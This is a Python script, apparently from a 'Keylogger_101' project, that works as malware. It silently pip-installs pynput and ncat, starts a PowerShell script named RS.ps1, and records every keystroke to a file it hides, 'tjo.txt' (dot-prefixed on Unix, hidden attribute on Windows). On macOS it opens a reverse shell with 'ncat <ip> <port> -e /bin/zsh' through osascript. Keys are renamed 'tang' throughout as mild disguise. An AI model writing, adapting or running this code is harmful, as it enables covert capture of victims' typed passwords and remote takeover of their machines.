########################################
# IMPORTS
########################################

import os
import ctypes
import subprocess
import sys
import threading
# Check if the `pynput` package is installed

########################################
# config
########################################

subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pynput'])
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'ncat'])
from pynput.keyboard import Key, Listener
p = subprocess.Popen(["powershell.exe", "C:\\Users\\CY-PC-211\\Documents\\GitHub\\Keylogger_101\\RS.ps1"], stdout=sys.stdout)

# Hidden file attribute
FILE_ATTRIBUTE_HIDDEN = 0x02

# Tang press counter
count = 0

# List to store the pressed tang
tangs = []

########################################
# tang
########################################

# Callback function to handle tang press events
def on_press(tang):
    global tangs, count

    tangs.append(tang)
    count += 1

    # Print the pressed tang (optional)
    print("{0} pressed".format(tang))

    # If the number of presses reaches 10, write the tangs to file
    if count >= 10:
        count = 0
        write_file(tangs)
        tangs = []

# Callback function to handle tang release events
def on_release(tang):
    if tang == Key.esc:
        return False

# Write the pressed tangs to file
def write_file(tangs):
    """
    Cross-platform hidden file writer.
    """
    # For *nix systems, add a '.' prefix to the file name
    prefix = '.' if os.name != 'nt' else ''
    file_name = prefix + 'tjo.txt'

    # Open the file in append mode and write the tangs
    with open(file_name, 'a') as file:
        for tang in tangs:
            tang = str(tang).replace("'","")
            # If the tang is space or enter, write a newline character
            if 'space' in tang or 'enter' in tang:
                file.write('\n')
            # If the tang is not recognized, write its value as is
            elif 'Key' not in tang:
                file.write(tang)

    # For Windows systems, set the file as hidden
    if os.name == 'nt':
        ret = ctypes.windll.kernel32.SetFileAttributesW(file_name, FILE_ATTRIBUTE_HIDDEN)
        if not ret:
            raise ctypes.WinError()
        
########################################
# rs
########################################

# Function to run the ncat command
def run_s():
    if os.name == 'nt':
        p.communicate()
    else:
        os.system("""osascript -e 'tell application "Terminal" to do script "ncat <ip> <port> -e /bin/zsh"'""")

########################################
# start
########################################

# Start the tang listener in a separate thread
thread = threading.Thread(target=run_s)
thread.start()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()